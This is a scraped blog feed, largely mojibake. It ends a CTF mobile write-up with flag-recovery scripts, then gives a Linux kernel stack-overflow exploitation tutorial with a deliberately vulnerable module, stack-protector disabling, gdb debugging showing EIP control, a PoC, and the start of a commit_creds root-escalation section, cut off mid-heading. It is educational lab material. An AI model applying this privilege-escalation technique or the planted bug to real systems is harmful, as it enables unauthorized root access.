äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰2</h1><p>è¿™ä¸ªé¢˜æœ‰ä¸¤ç§è§£æ³•ï¼Œç¬¬ä¸€ç§åç¼–è¯‘newClassName.classï¼Œé‡Œé¢æœ‰ä¸ªmd5ï¼š<code>fa3733c647dca53a66cf8df953c2d539</code> ï¼Œcmd5ä¸ŠæŸ¥ä¸€ä¸‹æ˜¯monkey99å°±æ˜¯flagã€‚<br>ç¬¬äºŒç§æ­£ç»Ÿçš„åšæ³•ï¼Œæ˜¯åç¼–è¯‘CheckPassword.classï¼Œå‘ç°é‡Œé¢åŠ¨æ€åŠ è½½äº†ä¸€ä¸ªclassï¼Œè¿™ä¸ªclassä½¿ç”¨aesåŠ å¯†å­˜äºClassEncæ–‡ä»¶ä¸­ï¼Œaeså¯†é’¥çš„åå…­è¿›åˆ¶æ˜¯<code>bb27630cf264f8567d185008c10c3f96</code> ï¼ŒæŠŠè¿™ä¸ªClassEncæ–‡ä»¶è§£å¯†ï¼Œå³å¯å¾—åˆ°newClassName.classæ–‡ä»¶çš„å†…å®¹ï¼Œåé¢çš„æ­¥éª¤åŒç¬¬ä¸€ä¸ªè§£æ³•</p><h1 id="MOBILE-4-The-Marauderâ€™s-Map"><a href="#MOBILE-4-The-Marauderâ€™s-Map" class="headerlink" title="MOBILE 4 The Marauderâ€™s Map"></a>MOBILE 4 The Marauderâ€™s Map</h1><p>æœ¬é¢˜ä½¿ç”¨åŒå­—èŠ‚æ··æ·†ï¼Œä¼—æ‰€å‘¨çŸ¥javaæ˜¯æ”¯æŒåŒå­—èŠ‚å˜é‡åçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥èµ·ä¸­æ–‡çš„å˜é‡åï¼Œè¿™å¹¶ä¸å½±å“ç¼–è¯‘ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åç¼–è¯‘classä»£ç ï¼Œç„¶åç›´æ¥é‡æ–°ç¼–è¯‘è¿è¡Œå°±å¥½äº†ã€‚<br>è¿™ä¸ªé¢˜ä½¿ç”¨çš„æ˜¯è‡ªå·±çš„systemç±»ï¼Œå› æ­¤è¦æ³¨æ„ä¸è¦å’Œç³»ç»Ÿçš„systemç±»å¼„æ··äº†ã€‚<br>è¿™ä¸ªé¢˜é¦–å…ˆç”±ä¸€ä¸ªå¤æ‚çš„å­—ç¬¦ä¸²æ¯ä¸ªå­—ç¬¦å³ç§»ä¸€ä½ç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼Œç„¶åéå†è¾“å…¥ï¼Œè®¡ç®—å½“å‰ç´¢å¼•çš„æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å€¼ï¼Œä½œä¸ºå¯¹å¯†é’¥çš„ç´¢å¼•ï¼Œç„¶åæ‹¼æ¥èµ·æ¥å°±æ˜¯ç›®æ ‡flagã€‚<br>è¿™é‡Œå¯†é’¥çš„è·å–åªèƒ½ç”¨javaæ¥å®ç°ï¼Œå…¶ä½™å¯ä»¥ç”¨Pythonæ¥å®ç°ã€‚<br>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   String x = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">char</span>[] var5;</span><br><span class="line">   <span class="keyword">int</span> var4 = (var5 = <span class="string">&quot;vÃˆÂ¾Â¤ÃŠÃŠÂ¬Ã†Ã†ÃŠvÃŒÂ¤ÃŠÂ²ÃŠÂ²Ã€ÃÂ¤Â¨Â¸Â¬&quot;</span>.toCharArray()).length;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var4; ++var3) &#123;</span><br><span class="line">      <span class="keyword">char</span> $ = var5[var3];</span><br><span class="line">      x = x + (<span class="keyword">char</span>)(($ &gt;&gt; <span class="number">1</span>) + <span class="number">15</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i - <span class="number">1</span>) + f(i - <span class="number">2</span>) <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">i, s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i) % len(s)</span><br><span class="line">key = <span class="string">&quot;JsnatterrtJuaththovacke&quot;</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l.append(key[d(i + k, key)])</span><br><span class="line">    l.append(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    i += <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h1 id="MOBILE-5-å–è¯å¯†ç "><a href="#MOBILE-5-å–è¯å¯†ç " class="headerlink" title="MOBILE 5 å–è¯å¯†ç "></a>MOBILE 5 å–è¯å¯†ç </h1><p>æœ¬é¢˜libä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œåªè¦æŒ‰æ•´æ•°æ•°ç»„é‡Œçš„é¡ºåºä»å­—ç¬¦ä¸²ä¸­å–å‡ºå­—ç¬¦ï¼Œæ‹¼æ¥èµ·æ¥å°±æ˜¯flag<br>ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W&#x27;</span></span><br><span class="line">l = [<span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0xA</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x13</span>, <span class="number">2</span>, <span class="number">0x3A</span>, <span class="number">0xC</span>, <span class="number">0x11</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>, <span class="number">0xB</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.append(key[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é™•è¥¿çœèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (3)---æ ˆæº¢å‡º</title>
      <link href="write-kernel-exploits-2.html"/>
      <url>write-kernel-exploits-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="write-linux-kernel-exploit-2"><a href="#write-linux-kernel-exploit-2" class="headerlink" title="write linux kernel exploit 2"></a>write linux kernel exploit 2</h1><h2 id="Stack-smashing"><a href="#Stack-smashing" class="headerlink" title="Stack smashing"></a>Stack smashing</h2><blockquote><p>ç®€å•çš„å†…æ ¸æ ˆæº¢å‡º</p></blockquote><h2 id="ä¸€ä¸ªç®€å•çš„demo"><a href="#ä¸€ä¸ªç®€å•çš„demo" class="headerlink" title="ä¸€ä¸ªç®€å•çš„demo"></a>ä¸€ä¸ªç®€å•çš„demo</h2><blockquote><p>æ¼æ´å¾ˆæ˜æ˜¾ï¼Œmemcpyæ²¡æœ‰å¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ vim stack_smashing.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug2_write</span><span class="params">(struct file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> localbuf[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(localbuf,buf,len);</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_smashing_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;stack_smashing driver init!\n&quot;</span>);</span><br><span class="line">create_proc_entry(<span class="string">&quot;bug2&quot;</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug2_write;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_smashing_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;stack_smashing driver exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(stack_smashing_init);</span><br><span class="line">module_exit(stack_smashing_exit);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">koæ–‡ä»¶çš„Makefile, KERNELDRç›®å½•è®¾ç½®ä¸ºlinuxå†…æ ¸æºç çš„æ ¹ç›®å½•å³å¯</span><br><span class="line">obj-m := stack_smashing.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions </span><br></pre></td></tr></table></figure><h2 id="ç®€å•çš„æµ‹è¯•"><a href="#ç®€å•çš„æµ‹è¯•" class="headerlink" title="ç®€å•çš„æµ‹è¯•"></a>ç®€å•çš„æµ‹è¯•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemuå¯åŠ¨å†…æ ¸ï¼ŒåŠ è½½ç›¸å…³çš„busybox</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;åŠ è½½æ¨¡å—</span></span><br><span class="line"><span class="string">$ insmod stack_smashing.ko</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-01.png"></a><br>POCæµ‹è¯•</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-02.png"></a></p><blockquote><p>å‘ç°æ­¤æ—¶ç¼–è¯‘çš„koæ˜¯æœ‰canaryæ£€æµ‹äº†ï¼Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼Œéœ€è¦å…³é—­æ ˆä¿æŠ¤æœºåˆ¶ï¼Œå¯ä»¥ä¿®æ”¹~linux_kernel/linux-2.6.32.1ä¸­çš„é…ç½®æ–‡ä»¶.configï¼Œæ‰¾åˆ°CONFIG_CC_STACKPROTECTORæ³¨é‡Šæ‰å³å¯ï¼Œç„¶åé‡æ–°ç¼–è¯‘å†…æ ¸å’Œkoæ–‡ä»¶<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-03.png"></a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å…³é—­CONFIG_CC_STACKPROTECTORä¹‹åé‡æ–°æµ‹è¯•æ ˆæº¢å‡º</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•æ¨¡å—"><a href="#è°ƒè¯•æ¨¡å—" class="headerlink" title="è°ƒè¯•æ¨¡å—"></a>è°ƒè¯•æ¨¡å—</h2><blockquote><p>ç”±äºæ¨¡å—å¹¶æ²¡æœ‰ä½œä¸ºvmlinuxçš„ä¸€éƒ¨åˆ†ä¼ ç»™gdbï¼Œå› æ­¤å¿…é¡»é€šè¿‡æŸç§æ–¹æ³•æŠŠæ¨¡å—ä¿¡æ¯å‘ŠçŸ¥gdbï¼Œå¯ä»¥é€šè¿‡add-symbol-fileå‘½ä»¤æŠŠæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯å‘ŠçŸ¥gdbï¼Œç”±äºæ¨¡å—ä¹Ÿæ˜¯ä¸€ä¸ªelfæ–‡ä»¶ï¼Œéœ€è¦çŸ¥é“æ¨¡å—çš„.textã€.bssã€.dataèŠ‚åŒºåœ°å€å¹¶é€šè¿‡add-symbol-fileæŒ‡å®šã€‚<br>æ¨¡å—stack_smashing.koçš„è¿™ä¸‰ä¸ªä¿¡æ¯åˆ†åˆ«ä¿å­˜åœ¨/sys/module/stack_smashing/sections/.textã€/sys/module/stack_smashing/sections/.bsså’Œ/sys/module/stack_smashing/sections/.dataï¼Œç”±äºstack_smashingæ¨¡å—æ²¡æœ‰bssã€dataèŠ‚åŒºæ‰€ä»¥åªéœ€è¦æŒ‡å®štextå³å¯ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è·å–textèŠ‚åŒºåœ°å€</span><br><span class="line">$ grep 0 /sys/module/stack_smashing/sections/.text</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl2-exploit-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl2-exploit-04.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨gdbä¸­æ·»åŠ æ¨¡å—ä¿¡æ¯</span><br><span class="line">gdb-peda$ add-symbol-file /home/swing/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000</span><br><span class="line"></span><br><span class="line">å¦‚æœå­˜åœ¨dataå’ŒbssèŠ‚åŒºå¯ä»¥å¦‚ä¸‹æŒ‡å®šï¼š</span><br><span class="line">gdb-peda$ add-symbol-file /home/swingr/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000 -s .bss xxxx -s .data xxxx</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¼æ´å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°bug2_writeåœ¨æ¨¡å—ä¸­çš„åç§»æ˜¯0x30ï¼Œæ‰€ä»¥åœ¨0xc8830000+0x30å¤„ä¸‹æ–­ç‚¹</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 1 at 0x30: bug2_write. (2 locations)</span><br><span class="line">gdb-peda$ b *0xc8830030</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-06.png"></a></p><h2 id="å…·ä½“è°ƒè¯•æ­¥éª¤"><a href="#å…·ä½“è°ƒè¯•æ­¥éª¤" class="headerlink" title="å…·ä½“è°ƒè¯•æ­¥éª¤"></a>å…·ä½“è°ƒè¯•æ­¥éª¤</h2><p>è°ƒè¯•æ¨¡å¼å¯åŠ¨kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -S -kernel arch&#x2F;i386&#x2F;boot&#x2F;bzImage -hda &#x2F;tmp&#x2F;my.img -append &quot;root&#x3D;&#x2F;dev&#x2F;sda&quot;</span><br></pre></td></tr></table></figure><p>è®¾ç½®qemu gdbserver(Ctrl+Alt+2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) gdbserver tcp::1234</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote localhost:1234</span><br><span class="line">gdb-peda$ c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»§ç»­è¿è¡Œqemu(Ctrl+Alt+1)</p><p>åœ¨å¯åŠ¨çš„å†…æ ¸ä¸­åŠ è½½æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ insmod stack_smashing.ko</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploiit2-07.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploiit2-07.png"></a>æ‰¾åˆ°æ¨¡å—stack_smashingçš„textåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xc8830000</span><br></pre></td></tr></table></figure><p>åœ¨gdbä¸­commandï¼‹cåœæ­¢kernelè¿è¡ŒåŠ è½½ç¬¦å·å¹¶è®¾ç½®æ–­ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">gdb-peda$ file vmlinux</span><br><span class="line">Reading symbols from vmlinux...done.</span><br><span class="line"></span><br><span class="line">gdb-peda$ add-symbol-file &#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko 0xc8830000</span><br><span class="line">add symbol table from file &quot;&#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">.text_addr &#x3D; 0xc8830000</span><br><span class="line">Reading symbols from &#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko...done.</span><br></pre></td></tr></table></figure><p>æ·»åŠ æ–­ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b bug2_write</span><br></pre></td></tr></table></figure><p>qemuä¸­è§¦å‘æ¼æ´<br>$ echo ABCDEFGHIJKLMNOPQRSTUVWXYZ &gt; /proc/bug2</p><p>è¿›å…¥gdbä¸­è°ƒè¯•<br>gdb-peda$ s<br>Warning: not running or target is remote<br>9        memcpy(localbuf,buf,len);</p><p>gdb-peda$ x /20i $eip<br>=&gt; 0xc883000f &lt;bug2_write+15&gt;:    mov    esi,edx<br>   0xc8830011 &lt;bug2_write+17&gt;:    shr    ecx,0x2<br>   0xc8830014 &lt;bug2_write+20&gt;:    lea    edi,[ebp-0x10]<br>   0xc8830017 &lt;bug2_write+23&gt;:    rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]<br>   0xc8830019 &lt;bug2_write+25&gt;:    mov    ecx,eax<br>   0xc883001b &lt;bug2_write+27&gt;:    and    ecx,0x3<br>   0xc883001e &lt;bug2_write+30&gt;:    je     0xc8830022 &lt;bug2_write+34&gt;<br>   0xc8830020 &lt;bug2_write+32&gt;:    rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]<br>   0xc8830022 &lt;bug2_write+34&gt;:    add    esp,0x8<br>   0xc8830025 &lt;bug2_write+37&gt;:    pop    esi<br>   0xc8830026 &lt;bug2_write+38&gt;:    pop    edi<br>   0xc8830027 &lt;bug2_write+39&gt;:    pop    ebp<br>   0xc8830028 &lt;bug2_write+40&gt;:    ret<br>å¯ä»¥çœ‹åˆ°memcpyå·²ç»è¢«ç¼–è¯‘å™¨ä¼˜åŒ–ä¸ºrep movsæŒ‡ä»¤</p><p>åœ¨å‡½æ•°è¿”å›å¤„ä¸‹æ–­ç‚¹<br>gdb-peda$ b *0xc8830028<br>gdb-peda$ c<br>gdb-peda$ x /10i $eip<br>=&gt; 0xc8830028 &lt;bug2_write+40&gt;:    ret    </p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶retä¹‹åæ§åˆ¶eipä¸º0x58575655<br>gdb-peda$ x /wx $esp<br>0xc7a63f30:    0x58575655</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">poc</span><br><span class="line">$ cat stack_smashing_poc.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="string">&#x27;A&#x27;</span>,<span class="number">24</span>);</span><br><span class="line">        *((<span class="keyword">void</span>**) (buf+<span class="number">20</span>)) = <span class="number">0x43434343</span>;</span><br><span class="line">        <span class="comment">//write(1,buf,sizeof(buf));</span></span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><p>ä»å†…æ ¸æ¨¡å¼èµ‹äºˆrootæƒé™commit_creds(prepare_kernel_cred(0))ç„¶åç›´æ¥è¿”å›ç”¨æˆ·æ¨¡å¼ï¼Œå¹¶åœ¨ç”¨æˆ·æ¨¡å¼å¯ä¸€ä¸ªshellï¼Œæ‹¿åˆ°root shellï¼Œå…¶ä¸­ä½¿ç”¨iretæŒ‡ä»¤æ¥è¿”å›ã€‚</p></blockquote><h3 id="iretç®€ä»‹"><a href="#iretç®€ä»‹" class="headerlink" title="iretç®€ä»‹"></a>iretç®€ä»‹</h3><blockquote></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å½“ä½¿ç”¨IRETæŒ‡ä»¤è¿”å›åˆ°ç›¸åŒä¿æŠ¤çº§åˆ«çš„ä»»åŠ¡æ—¶ï¼ŒIRETä¼šä»å †æ ˆå¼¹å‡ºä»£ç æ®µé€‰æ‹©å­åŠæŒ‡ä»¤æŒ‡é’ˆåˆ†åˆ«åˆ°CSä¸IPå¯„å­˜å™¨ï¼Œå¹¶å¼¹å‡ºæ ‡å¿—å¯„å­˜å™¨å†…å®¹åˆ°EFLAGSå¯„å­˜å™¨ã€‚</span><br><span class="line"></span><br><span class="line">å½“ä½¿ç”¨IRETæŒ‡ä»¤è¿”å›åˆ°ä¸€ä¸ªä¸åŒçš„ä¿æŠ¤çº§åˆ«æ—¶ï¼ŒIRETä¸ä»…ä¼šä»å †æ ˆå¼¹å‡ºä»¥ä¸Šå†…å®¹ï¼Œè¿˜ä¼šå¼¹å‡ºå †æ ˆæ®µé€‰æ‹©å­åŠå †æ ˆæŒ‡é’ˆåˆ†åˆ«åˆ°SSä¸SPå¯„å­˜å™¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="ç¡¬ä»¶åœ¨æ ˆä¸Šä¿å­˜äº†trap-frameï¼Œiretä»ä¸‹é¢çš„ç»“æ„ä¸­æ¢å¤åˆ°ç”¨æˆ·æ¨¡å¼"><a href="#ç¡¬ä»¶åœ¨æ ˆä¸Šä¿å­˜äº†trap-frameï¼Œiretä»ä¸‹é¢çš„ç»“æ„ä¸­æ¢å¤åˆ°ç”¨æˆ·æ¨¡å¼" class="headerlink" title="ç¡¬ä»¶åœ¨æ ˆä¸Šä¿å­˜äº†trap 